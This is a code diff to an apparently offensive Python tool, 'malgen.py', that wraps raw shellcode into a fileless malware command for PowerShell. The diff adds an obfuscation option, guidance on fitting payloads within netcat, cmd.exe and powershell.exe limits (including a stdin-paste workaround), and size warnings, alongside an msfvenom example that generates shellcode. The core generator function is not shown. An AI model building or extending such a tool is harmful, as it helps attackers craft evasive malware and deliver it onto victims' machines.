@@ -95,12 +95,32 @@ parser = argparse.ArgumentParser(
 
             msfvenom -p windows/exec CMD=calc.exe -f raw -o PoC.bin
 
-        ~malgen.py by @haxys2~
+        Additional Considerations
+        -------------------------
+        The output of this script can be fairly large. It is important to
+        consider the constraints of your payload transmission method when
+        choosing to encode or obfuscate the payload.
+
+        * If transmitting via a remote shell such as `netcat`, your commands
+          may be limited to 4,096 bytes.
+        * If pasting the command into an instance of `cmd.exe`, the command is
+          limited to 8,192 bytes.
+        * If pasting the command directly into `powershell.exe`, the command
+          is limited to 32,767 bytes.
+
+        With local or SSH access, there is one workaround to these buffer-size
+        limitations. Simply type `powershell.exe -` and hit enter, then paste
+        your payload, sans the preceding `powershell` and its command-line
+        flags.
     ''')
 )
 parser.add_argument(
     '-e', '--encode', action='store_const', default=False, const=True,
     help="Base64-encode output"
+)
+parser.add_argument(
+    '-o', '--obfuscate', action='store_const', default=False, const=True,
+    help="Obfuscate output"
 )
 parser.add_argument(
     'payload', help='Raw-formatted 32-bit binary payload'
@@ -110,7 +130,19 @@ parser.add_argument(
 )
 
 args = parser.parse_args()
-
+print("[*] Crafting fileless malware...")
+print(f"[+]   - Binary Payload: {args.payload}")
+print(f"[+]   - Output File: {args.output}")
+print(f"[+]   - Obfuscation: {'enabled' if args.obfuscate else 'disabled'}")
+print(f"[+]   - Encoding: {'enabled' if args.encode else 'disabled'}")
+print(f"[*] Payload saved to {args.output}.")
 with open(args.output, "w") as outfile:
-    outfile.write(make_malware(args.payload, args.encode))
-print(f"Script saved!")
+    output = make_malware(args.payload, args.encode, args.obfuscate)
+    print(f"[*] Final payload size: {len(output)} bytes.")
+    if len(output) > 4096:
+        print("[!]   - Payload too large for transmission via remote shell.")
+    if len(output) > 8192:
+        print("[!]   - Payload too large for pasting into `cmd.exe`.")
+    if len(output) > 32767:
+        print("[!]   - Payload too large for pasting into `powershell.exe`.")
+    outfile.write(output)
